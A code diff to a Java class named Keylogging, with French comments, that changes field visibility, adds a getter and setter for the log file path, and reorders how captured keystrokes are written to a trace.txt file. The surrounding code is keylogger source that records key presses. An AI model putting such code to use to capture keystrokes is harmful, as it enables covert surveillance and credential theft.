@@ -42,7 +42,7 @@ public class Keylogging extends Thread {
 	/*													   ARGUMENTS																	   /	
 	/**************************************************************************************************************************************/
 	
-	public static String cheminFile; // nom du Fichier
+	private static String cheminFile; // nom du Fichier
 	private static File f;
 	private int code;
 	private static boolean capslock; // Flag pour les touches speciales
@@ -77,6 +77,7 @@ public class Keylogging extends Thread {
 
 	
 	
+	
 
 	/**************************************************** *********************************************************************************/
 	/*													   METHODES																	   /	
@@ -102,12 +103,16 @@ public class Keylogging extends Thread {
 							code = event.getVirtualKeyCode();
 
 							char character = codeToChar(code);
-							pw.print(character);
-							pw.flush();
+						
 							if (nombredecaractereparligne++ > 40) {
 								pw.println();
 								pw.flush();
 								nombredecaractereparligne = 0;
+							}
+							else
+							{
+								pw.print(character);
+								pw.flush();								
 							}
 						} catch (Exception e) {
 							e.printStackTrace();
@@ -599,6 +604,22 @@ public class Keylogging extends Thread {
 				+ "trace.txt";
 		return chemin;
 	}
+
+	public static String getCheminFile() {
+		return cheminFile;
+	}
+
+
+
+
+
+	public static void setCheminFile(String cheminFile) {
+		Keylogging.cheminFile = cheminFile;
+	}
+
+
+
+
 
 	public void supprimerFichier() {
 		f.delete();
